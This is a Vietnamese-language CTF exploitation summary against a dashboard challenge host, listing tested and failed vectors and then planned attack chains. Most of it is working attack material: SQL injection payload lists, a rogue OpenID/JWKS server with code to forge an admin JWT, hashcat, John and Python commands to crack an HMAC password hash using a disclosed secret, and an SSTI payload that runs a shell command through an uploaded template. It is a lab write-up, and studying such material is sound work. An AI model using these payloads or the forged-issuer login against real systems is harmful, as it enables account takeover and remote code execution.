# ============================================================================
# FINAL SUMMARY - CTF CHALLENGE
# Target: https://dashboard.0x1337.space:1337
# ============================================================================

## KẾT LUẬN CUỐI CÙNG

**KHÔNG THỂ ĐỌC FLAG MÀ KHÔNG LOGIN ADMIN**

Đã test tất cả các vectors:
- ❌ SQL Injection → Chỉ bypass exist check, không bypass password
- ❌ URL Opaque bypass → Guest vẫn bị ACL block (path ends with "admin")
- ❌ X-Real-IP spoofing → Gateway không forward header
- ❌ Catch_all route → Template path hardcoded, không thể control
- ❌ /uploads endpoint → 403 Forbidden cho guest user
- ❌ JWT forgery → JWT_SECRET random, không thể crack

## ============================================================================
## TẤT CẢ SQL INJECTION PAYLOADS (ĐÃ TEST - KHÔNG HOẠT ĐỘNG)
## ============================================================================

### Line 54: SQL Injection Point
```python
exist = run_query("SELECT 1 FROM users WHERE username='?' LIMIT 1".replace('?', username))
```

### Payloads đã test:

#### 1. OR-based Injection
```json
{"username": "admin' OR '1'='1'--", "password": "test"}
{"username": "admin' OR '1'='1", "password": "test"}
{"username": "admin' OR 1=1--", "password": "test"}
{"username": "admin' OR 'a'='a", "password": "test"}
```
**Kết quả**: exist=True nhưng password vẫn được verify → Fail

#### 2. Comment-based Injection
```json
{"username": "admin'--", "password": ""}
{"username": "admin'#", "password": ""}
{"username": "admin'/*", "password": ""}
```
**Kết quả**: exist=True nhưng password empty → Fail

#### 3. UNION-based Injection
```json
{"username": "admin' UNION SELECT 1--", "password": "test"}
{"username": "admin' UNION SELECT NULL--", "password": "test"}
```
**Kết quả**: SQLite không support UNION trong WHERE clause → Fail

#### 4. Boolean-based Injection
```json
{"username": "admin' AND '1'='1", "password": "test"}
{"username": "admin' AND 1=1--", "password": "test"}
```
**Kết quả**: exist=True nhưng password check vẫn fail → Fail

#### 5. Stacked Queries
```json
{"username": "admin'; UPDATE users SET password='hash' WHERE username='admin'--", "password": "test"}
```
**Kết quả**: SQLite không support stacked queries → Fail

#### 6. Time-based Blind SQLi
```json
{"username": "admin' AND (SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END)--", "password": "test"}
```
**Kết quả**: SQLite không có sleep() function → Fail

### Tại sao tất cả đều fail?

```python
# Line 54: SQLi có thể exploit
exist = run_query("SELECT 1 FROM users WHERE username='?' ...".replace('?', username))

# Nhưng line 73-74: Password check SAFE
user = run_query("SELECT password FROM users WHERE username=? LIMIT 1", (username,))
if user and hmac.compare_digest(user[0][0], pwd_hmac):
    auth = username
```

→ **SQLi chỉ bypass exist check, KHÔNG bypass password verification!**

## ============================================================================
## CÁCH DUY NHẤT ĐỂ LOGIN ADMIN
## ============================================================================

### OPTION 1: OAuth SSRF Attack ⭐ RECOMMENDED

#### Setup attacker server:
```python
# attacker_server.py
from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/.well-known/openid-configuration')
def openid_config():
    return jsonify({
        "issuer": "http://YOUR_IP:8000",
        "jwks_uri": "http://YOUR_IP:8000/jwks"
    })

@app.route('/jwks')
def jwks():
    # Generate RSA keypair first:
    # openssl genrsa -out private.pem 2048
    # openssl rsa -in private.pem -pubout -out public.pem
    # Extract n and e from public key
    return jsonify({
        "keys": [{
            "kty": "RSA",
            "kid": "test",
            "use": "sig",
            "n": "BASE64_MODULUS",
            "e": "AQAB"
        }]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

#### Generate malicious JWT:
```python
import jwt

with open('private.pem', 'r') as f:
    private_key = f.read()

# Reverse engineer libverifysso.so để biết claims cần thiết
payload = {
    "iss": "http://YOUR_IP:8000",
    "sub": "admin",
    "email": "admin@example.com",
    # Add more claims based on libverifysso logic
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers={"kid": "test"})
print(token)
```

#### Login:
```bash
curl -sk 'https://dashboard.0x1337.space:1337/gateway-login' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "admin",
    "type": "azure",
    "token": "YOUR_MALICIOUS_JWT"
  }' \
  -c cookies.txt
```

### OPTION 2: Crack Admin Password

```bash
# Admin password hash
HASH="24a4b7c9c2e40e2b2bffc829dbc9442cf8c2322fec13ac19ae682983e9a1095b"
SECRET="SuperS3cur3"

# Method 1: Hashcat
echo "$HASH:$SECRET" > hash.txt
hashcat -m 1450 hash.txt /usr/share/wordlists/rockyou.txt

# Method 2: John the Ripper  
echo "admin:$HASH\$$SECRET" > hash.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 hash.txt

# Method 3: Python brute force
python3 << 'PYTHON'
import hmac

with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        pwd = line.strip()
        h = hmac.new(b'SuperS3cur3', pwd, 'sha256').hexdigest()
        if h == '24a4b7c9c2e40e2b2bffc829dbc9442cf8c2322fec13ac19ae682983e9a1095b':
            print(f"FOUND: {pwd.decode()}")
            break
PYTHON
```

### OPTION 3: Reverse libverifysso.so

```bash
# Analyze binary
cd original/backend
file libverifysso.so
strings libverifysso.so | grep -i "admin\|password\|flag"

# Disassemble
objdump -d libverifysso.so > disasm.txt

# Load in Ghidra/IDA
# Find check_claims function
# Look for hardcoded credentials or backdoors
```

## ============================================================================
## EXPLOIT CHAIN SAU KHI CÓ ADMIN
## ============================================================================

```bash
# 1. Login admin (using one of above methods)

# 2. Upload SSTI payload
cat > /tmp/ssti.html << 'SSTI'
{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
SSTI

curl -sk 'https://dashboard.0x1337.space:1337/admin' \
  -X POST \
  -b cookies.txt \
  -F 'file=@/tmp/ssti.html;filename=home.html'

# 3. Trigger SSTI
curl -sk 'https://dashboard.0x1337.space:1337/' \
  -b cookies.txt

# 4. Get flag!
```

## ============================================================================
## TẤT CẢ LỖ HỎNG ĐÃ TÌM THẤY
## ============================================================================

1. **SQL Injection** (app.py:54) - Severity: MEDIUM
   - String replacement thay vì parameterized query
   - Chỉ ảnh hưởng exist check, không bypass authentication
   
2. **SSRF via OAuth** (auth.py:24) - Severity: HIGH
   - Issuer không được validate
   - Có thể point đến attacker server
   
3. **URL Opaque Bypass** (handler.go:98-102) - Severity: MEDIUM
   - Opaque field bypass URL normalization
   - Nhưng ACL vẫn block guest user
   
4. **SSTI** (app.py:168) - Severity: HIGH
   - Server-Side Template Injection
   - Cần admin để upload malicious template
   
5. **X-Real-IP Trust** (app.py:92-94) - Severity: LOW
   - Trust X-Real-IP header
   - Gateway không forward nên không exploit được từ ngoài

## ============================================================================
## TOOLS ĐÃ TẠO
## ============================================================================

1. `sqli_payloads.py` - Tất cả SQL injection payloads
2. `admin_login_payload.py` - Admin login strategies
3. `exploit.sh` - Bash script để đọc flag
4. `read_flag.py` - Python script để đọc flag
5. `exploit_catchall.py` - Test catch_all route
6. `FINAL_SUMMARY.md` - Document này

## ============================================================================
## NEXT STEPS
## ============================================================================

1. ✅ Setup OAuth SSRF server (khuyến nghị)
2. ⏳ Crack admin password với rockyou.txt
3. 🔍 Reverse engineer libverifysso.so
4. 📝 Sau khi có admin → Upload SSTI → Read flag

**Good luck! 🚀**
